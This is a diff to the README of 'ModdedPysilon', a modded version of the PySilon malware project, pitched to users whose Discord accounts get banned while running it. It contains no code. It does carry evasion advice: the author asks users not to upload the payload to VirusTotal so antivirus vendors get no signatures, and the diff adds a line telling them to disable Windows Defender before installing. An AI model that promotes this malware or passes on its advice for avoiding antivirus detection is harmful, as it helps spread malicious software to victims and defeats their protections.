@@ -1,7 +1,10 @@
+
 #ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
 #MODDED AUTHOR : https://github.com/MaitreAuxb/
 #I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
 #PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )
+
+Because you make a malware, make sure you have windows defender disabled before installing the ModdedPysilon
 
 Are you mad that your discord account is always getting fucked after 1 week of using Pysilon ?
 If that's the case, you're on the right place.
